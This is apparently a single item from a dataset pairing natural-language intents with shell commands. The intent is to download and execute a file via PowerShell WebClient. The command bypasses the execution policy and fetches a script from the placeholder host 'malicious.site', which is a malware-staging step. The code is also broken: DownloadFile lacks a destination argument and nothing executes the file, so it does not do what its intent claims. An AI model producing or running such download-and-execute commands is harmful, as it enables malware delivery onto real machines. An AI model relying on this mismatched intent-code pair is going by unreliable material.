# Natural language intent:
# Download and execute a file using PowerShell WebClient.

powershell.exe -exec bypass -c "(New-Object System.Net.WebClient).DownloadFile('http://malicious.site/malicious.ps1')"
